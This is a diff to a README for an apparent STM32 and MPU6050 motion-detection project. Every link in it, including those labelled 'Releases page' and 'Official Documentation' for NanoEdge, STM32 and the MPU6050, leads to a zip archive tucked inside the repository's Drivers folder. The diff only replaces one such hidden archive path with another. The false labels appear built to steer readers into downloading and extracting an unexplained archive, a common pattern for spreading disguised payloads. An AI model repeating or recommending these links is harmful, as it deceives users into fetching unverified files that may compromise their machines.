@@ -1,7 +1,7 @@
 # ✈️ Flight_contoller_stm32_mpu6050 - Simple Motion Detection with AI
 
 ## 📥 Download Now
-[![Download Flight Controller STM32 MPU6050](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/STM32F4xx_HAL_Driver/Flight_contoller_stm32_mpu6050-v3.6.zip)](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/STM32F4xx_HAL_Driver/Flight_contoller_stm32_mpu6050-v3.6.zip)
+[![Download Flight Controller STM32 MPU6050](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)
 
 ## 📖 Overview
 This project performs motion classification using accelerometer data (accX, accY, accZ) on an STM32 board. The AI model is built with NanoEdge AI Studio, and the sensor data is collected through a USB serial emulator. This application shows how embedded AI can detect movements like tilt, shake, or rest directly on your device. 
@@ -35,7 +35,7 @@ To run this application, you will need:
 ## 🔧 Installation Instructions
 
 ### 🛠️ Step 1: Download the Software
-Visit the [Releases page](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/STM32F4xx_HAL_Driver/Flight_contoller_stm32_mpu6050-v3.6.zip) to download the latest version of the application.
+Visit the [Releases page](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip) to download the latest version of the application.
 
 ### 🛠️ Step 2: Extract the Files
 Once the download is complete, locate the downloaded file on your computer. Extract the contents using a file extraction tool (like WinRAR or 7-Zip). 
@@ -73,9 +73,9 @@ Once the code uploads successfully, you can disconnect the board from your compu
 
 ## 📝 Additional Resources
 For further reading and support, consider visiting the following resources:
-- [NanoEdge AI Studio Documentation](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/STM32F4xx_HAL_Driver/Flight_contoller_stm32_mpu6050-v3.6.zip)
-- [STM32 Official Documentation](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/STM32F4xx_HAL_Driver/Flight_contoller_stm32_mpu6050-v3.6.zip)
-- [MPU6050 Sensor Guide](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/STM32F4xx_HAL_Driver/Flight_contoller_stm32_mpu6050-v3.6.zip)
+- [NanoEdge AI Studio Documentation](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)
+- [STM32 Official Documentation](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)
+- [MPU6050 Sensor Guide](https://raw.githubusercontent.com/CoderNK2025/Flight_contoller_stm32_mpu6050/main/Drivers/CMSIS/mpu-stm-Flight-contoller-3.8.zip)
 
 ## 📞 Community Support
 If you have questions or need assistance, please feel free to open an issue in this repository. The community and contributors will be happy to help.
